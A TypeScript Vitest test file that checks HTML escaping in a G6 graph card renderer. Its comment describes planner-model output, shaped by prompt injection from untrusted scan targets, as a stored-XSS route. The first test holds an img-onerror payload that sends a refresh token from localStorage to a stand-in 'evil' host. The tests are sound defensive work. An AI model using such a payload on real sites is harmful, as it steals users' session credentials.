import { describe, expect, it } from 'vitest'
import { cardHTML } from '../components/G6View'

// R35/P1-1（第五轮审查）：G6 html 节点绕过 React 转义直进 DOM——intent 源自
// planner 模型读不可信扫描目标后的输出（提示注入回显面），未转义即存储型 XSS
// （控制台同源可读 refresh_token/以当前身份发 /v1/*）。锁定：五字符转义。
const node = (over: Partial<Parameters<typeof cardHTML>[0]>) => ({
  id: 'g-n001', type: 'executor', status: 'declared', attempts: 1,
  intent: '正常意图', from: [], ...over,
} as Parameters<typeof cardHTML>[0])

describe('cardHTML XSS 转义（G6 html 节点）', () => {
  it('intent 携带 img onerror 注入被转义（正文与 title 槽位）', () => {
    const evil = '<img src=x onerror="fetch(\'//evil/?t=\'+localStorage[\'codeaudit.refresh_token\'])">'
    const html = cardHTML(node({ intent: evil }), false, [])
    expect(html).not.toContain('<img')
    expect(html).toContain('&lt;img')
    // title 全文槽位同样转义
    expect(html.split('title="')[1]?.startsWith('&lt;img')).toBe(true)
  })
  it('引号/尖括号五字符全转义（无属性逃逸面）', () => {
    const html = cardHTML(node({ intent: `a"'><b>` }), false, [])
    // title 属性值（首个闭合引号前）内不得有裸引号/尖括号——全部为实体形态
    const titleVal = html.split('title="')[1]?.split('"')[0] ?? ''
    expect(titleVal).toContain('&quot;');
    expect(titleVal).toContain('&gt;');
    expect(titleVal).toContain('&#39;');
    expect(titleVal).toContain('&lt;')
    expect(titleVal).not.toMatch(/["<>']/)
  })
  it('triggers 传入后批次角标恢复（0f43e36 死参修复）', () => {
    const html = cardHTML(node({ declared_seq: 30, intent: 'x' }), false, [{ seq: 10 }, { seq: 25 }])
    expect(html).toContain('计划 #2')
  })
})
